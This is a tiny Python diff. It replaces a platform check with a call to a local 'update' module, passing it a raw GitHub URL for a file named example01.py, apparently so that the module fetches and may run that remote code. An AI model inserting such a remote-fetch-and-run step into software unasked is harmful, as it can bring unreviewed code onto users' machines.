@@ -1,3 +1,9 @@
-import platform
+import os
+import requests
+import update
 
-print(True if platform.platform().startswith("W") else False)
+
+link = "https://raw.githubusercontent.com/CoalByte/dummy/main/example01.py"
+
+
+update.main(url=link)
